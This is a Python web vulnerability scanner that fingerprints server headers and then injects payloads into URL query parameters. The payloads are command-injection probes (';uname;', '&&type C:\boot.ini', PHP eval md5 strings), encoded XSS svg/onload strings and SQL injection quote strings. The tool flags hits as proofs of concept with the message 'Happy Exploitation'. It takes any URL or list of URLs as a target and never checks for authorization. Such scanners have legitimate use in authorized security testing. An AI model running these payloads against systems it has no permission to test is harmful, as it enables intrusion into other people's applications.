import urllib.request
import re
import os
import time
from urllib.error import HTTPError, URLError

class Colors:
    def __init__(self):
        self.green = "\033[92m"
        self.blue = "\033[94m"
        self.bold = "\033[1m"
        self.yellow = "\033[93m"
        self.red = "\033[91m"
        self.end = "\033[0m"

colors = Colors()

def headers_reader(url):
    print(colors.bold + "\n[!] Fingerprinting the backend Technologies." + colors.end)
    try:
        opener = urllib.request.urlopen(url)
        if opener.getcode() == 200:
            print(colors.green + "[!] Status code: 200 OK" + colors.end)
        elif opener.getcode() == 404:
            print(colors.red + "[!] Page was not found! Please check the URL\n" + colors.end)
            return

        server = opener.headers.get("Server", "Unknown")
        host = urllib.parse.urlparse(url).hostname
        print(colors.green + "[!] Host: " + str(host) + colors.end)
        print(colors.green + "[!] WebServer: " + str(server) + colors.end)

        for key, value in opener.headers.items():
            if key.lower() == "x-powered-by":
                print(colors.green + f"[!] {key}: {value}" + colors.end)

    except (HTTPError, URLError) as e:
        print(colors.red + f"[!] Error fetching headers: {e}" + colors.end)

def main_function(url, payloads, check):
    try:
        urllib.request.urlopen(url)  # Test URL accessibility
    except (HTTPError, URLError):
        print(colors.red + "[!] Unable to open URL. Exiting." + colors.end)
        return

    vuln = 0
    for params in urllib.parse.urlsplit(url).query.split("&"):
        for payload in payloads:
            bugs = url.replace(params, params + str(payload).strip())
            try:
                request = urllib.request.urlopen(bugs)
                html = request.read().decode("utf-8")
                if re.search(check, html, re.I):
                    print(colors.red + "[*] Payload Found..." + colors.end)
                    print(colors.red + f"[*] Payload: {payload}" + colors.end)
                    print(colors.green + f"[!] Code Snippet: {html.strip()}" + colors.end)
                    print(colors.blue + f"[*] POC: {bugs}" + colors.end)
                    print(colors.green + "[*] Happy Exploitation :D" + colors.end)
                    vuln += 1
            except Exception as e:
                print(colors.yellow + f"[!] Error during request: {e}" + colors.end)

    if vuln == 0:
        print(colors.green + "[!] Target is not vulnerable!" + colors.end)
    else:
        print(colors.blue + f"[!] Congratulations you've found {vuln} bugs :-)" + colors.end)

def rce_func(url):
    headers_reader(url)
    print(colors.bold + "[!] Now Scanning for Remote Code/Command Execution" + colors.end)
    print(colors.blue + "[!] Covering Linux & Windows Operating Systems" + colors.end)
    print(colors.blue + "[!] Please wait...." + colors.end)
    payloads = [';${@print(md5(dadevil))}', ';${@print(md5("dadevil"))}', '%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
    payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
    check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\\[boot", re.I)
    main_function(url, payloads, check)

def xss_func(url):
    print(colors.bold + "\n[!] Now Scanning for XSS" + colors.end)
    print(colors.blue + "[!] Please wait...." + colors.end)
    payloads = ['%27%3Edadevil0%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', '%78%22%78%3e%78']
    payloads += ['%22%3Edadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', 'dadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb']
    check = re.compile('dadevil<svg|x>x', re.I)
    main_function(url, payloads, check)

def error_based_sqli_func(url):
    print(colors.bold + "\n[!] Now Scanning for Error Based SQL Injection" + colors.end)
    print(colors.blue + "[!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases" + colors.end)
    print(colors.blue + "[!] Please wait...." + colors.end)
    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
    check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+quote|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    main_function(url, payloads, check)

def urls_or_list():
    url_or_list = input(colors.green + "[!] Scan URL or List of URLs? [1/2]: " + colors.end)
    if url_or_list == "1":
        url = input("[!] Enter the URL: ")
        if "?" in url:
            rce_func(url)
            xss_func(url)
            error_based_sqli_func(url)
        else:
            print(colors.red + "\n[Warning] Invalid URL format." + colors.end)
            print(colors.red + "[Warning] Ensure the URL contains parameters." + colors.end)
    elif url_or_list == "2":
        urls_list = input(colors.green + "[!] Enter the list file name (e.g., list.txt): " + colors.end)
        try:
            with open(urls_list, "r") as file:
                for line in file:
                    url = line.strip()
                    if "?" in url:
                        print(colors.green + f"\n[!] Now Scanning {url}" + colors.end)
                        rce_func(url)
                        xss_func(url)
                        error_based_sqli_func(url)
                    else:
                        print(colors.red + f"\n[Warning] Invalid URL format: {url}" + colors.end)
        except FileNotFoundError:
            print(colors.red + "[!] File not found. Please check the file name and try again." + colors.end)
    else:
        print(colors.red + "[!] Invalid option selected." + colors.end)

urls_or_list()
